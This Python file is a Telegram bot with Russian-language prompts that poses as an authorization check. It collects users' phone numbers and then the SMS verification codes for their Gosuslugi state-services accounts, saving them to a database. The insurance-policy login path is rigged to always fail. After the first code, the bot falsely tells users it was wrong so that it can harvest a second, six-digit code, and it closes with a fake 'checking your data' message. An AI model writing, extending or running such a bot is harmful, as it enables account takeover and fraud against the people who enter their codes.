import re
import os
import random
import time

from db.user_operations import (create_user, update_user_phone, update_user_code_short, check_user_exists,
                                update_user_code_long)

from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram import Router
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.context import FSMContext

from dotenv import load_dotenv

load_dotenv()

API_TOKEN = os.getenv('TELEGRAM_API_KEY')
ADMIN_ID = os.getenv('ADMIN_ID')

START_MESSAGE = ("Для начала работы системы Вам неодходимо авторизироваться.")

bot = Bot(
    token=API_TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML)
)
dp = Dispatcher()
router = Router()

class UserState(StatesGroup):
    waiting_for_phone = State()
    waiting_for_code = State()
    waiting_for_police = State()
    waiting_for_second_code = State()


login_keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="НОМЕР ПОЛИСА", callback_data="login_password")],
        [InlineKeyboardButton(text="ГОСУСЛУГИ", callback_data="gosuslugi")]
])


def is_valid_russian_phone(phone):
    pattern = r'^\+7\d{10}$'
    return re.match(pattern, phone)

def is_valid_policy(policy):
    pattern = r'^\d{16}$'
    return re.match(pattern, policy)


def is_valid_code1(policy):
    pattern = r'^\d{4}$'
    return re.match(pattern, policy)


def is_valid_code2(policy):
    pattern = r'^\d{6}$'
    return re.match(pattern, policy)


@router.message(Command(commands=['start']))
async def send_welcome(message: Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
    [
        InlineKeyboardButton(text="НАЧАТЬ", callback_data="verify"),
    ]
])
    user_id = message.from_user.id
    try:
        check_user = await check_user_exists(str(user_id))
        if not check_user:
            await create_user(message.from_user.username, str(user_id))
    except Exception as e:
        pass
    await message.answer(START_MESSAGE, reply_markup=kb)


@router.callback_query(lambda callback: callback.data == "verify")
async def ask_for_phone(callback_query: CallbackQuery, state: FSMContext):
    await callback_query.message.answer("Введите ваш номер, для прохождения проверки.\n"
                                        "Пожалуйста, введите номер в формате +7XXXXXXXXXX.")
    await state.set_state(UserState.waiting_for_phone)


@router.callback_query(lambda callback: callback.data == "gosuslugi")
async def handle_gosuslugi(callback_query: types.CallbackQuery, state: FSMContext):
    await state.set_state(UserState.waiting_for_code)
    await callback_query.message.answer("Пожалуйста, дождитесь SMS-сообщения и введите код.")


@router.callback_query(lambda callback: callback.data == "login_password")
async def handle_login(callback_query: types.CallbackQuery, state: FSMContext):
    await state.set_state(UserState.waiting_for_police)
    await callback_query.message.answer('Введите номер вашего полиса:')


@router.message(UserState.waiting_for_phone)
async def receive_phone(message: Message, state: FSMContext):
    user_phone = message.text.strip()

    user_id = message.from_user.id
    if is_valid_russian_phone(user_phone):
        check_user = await check_user_exists(str(user_id))
        if check_user:
            await update_user_phone(str(user_id), user_phone)
            await message.answer("Выберите способ авторизации:", reply_markup=login_keyboard)
    else:
        await message.answer("Неверный формат номера.\nПожалуйста, введите номер в формате +7XXXXXXXXXX.")


@router.message(UserState.waiting_for_code)
async def receive_code(message: Message, state: FSMContext):
    user_code = message.text.strip().replace(" ", '')
    user_id = message.from_user.id
    if is_valid_code1(user_code):
        await update_user_code_short(str(user_id), user_code)
        await state.set_state(UserState.waiting_for_second_code)
        await message.answer("Ваш код получен.")
        time.sleep(4)
        await message.answer("Код не верный.\n"
                             "Отправлено SMS-сообщение с новым кодом.")
    else:
        await message.answer("Код не верный.\n"
                             "Убедитесь в правильности введеного кода.")

@router.message(UserState.waiting_for_police)
async def receive_police(message: Message, state: FSMContext):
    police = message.text.strip().replace(" ", '')
    if is_valid_policy(police):
        time.sleep(random.randint(3,5))
        kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="ГОСУСЛУГИ", callback_data="gosuslugi")]])
        await message.answer("Не удается войти.\nПожалуйста, попробуйте другой способ.\n"
                                            "Использовать ГОСУСЛУГИ:",
                                            reply_markup=kb)
    else:
        await message.answer("Ожидается номер в формате:\n"
                             "ХХХХ ХХХХ ХХХХ ХХХХ")


@router.message(UserState.waiting_for_second_code)
async def receive_second_code(message: Message, state: FSMContext):
    user_code = message.text.strip().replace(" ", '')
    user_id = message.from_user.id
    if is_valid_code2(user_code):
        await update_user_code_long(str(user_id), user_code)
        user = await check_user_exists(str(user_id))
        await message.answer("Система проверяет ваши данные.\nОжидайте подтверждения.")
        await state.clear()
    else:
        await message.answer("Код не верный.\n"
                             "Убедитесь в правильности введеного кода.")














async def main():
    dp.include_router(router)  # Реєстрація хендлерів
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == '__main__':
    import asyncio
    asyncio.run(main())
